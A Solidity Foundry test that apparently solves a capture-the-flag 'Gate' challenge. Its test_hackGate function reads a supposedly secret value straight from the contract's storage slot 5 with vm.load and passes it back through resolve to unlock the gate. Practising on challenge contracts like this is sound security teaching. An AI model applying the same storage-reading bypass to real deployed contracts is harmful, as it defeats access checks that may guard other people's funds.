// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Gate} from "../src/greeterGate.sol";

contract GreeterGateTest is Test {
    Gate public gate;

    function setUp() external {
        // Simulate secret data
        bytes32 data1 = calcHash(block.timestamp);
        bytes32 data2 = calcHash(block.number);
        bytes32 data3 = calcHash(uint256(uint160(address(block.coinbase))));

        gate = new Gate(data1, data2, data3);
    }

    function test_hackGate() public {
        bytes32 answer = vm.load(address(gate), bytes32(uint256(5)));

        bytes memory bytesAnswer;
        assembly {
            mstore(bytesAnswer, 0x20)
            mstore(add(bytesAnswer, 0x20), answer)
        }

        bytes memory callData = abi.encodeCall(Gate.unlock, (bytesAnswer));
        gate.resolve(callData);
        assertTrue(gate.isSolved());
    }

    function calcHash(uint256 input) private pure returns (bytes32) {
        return keccak256(abi.encode(input));
    }
}
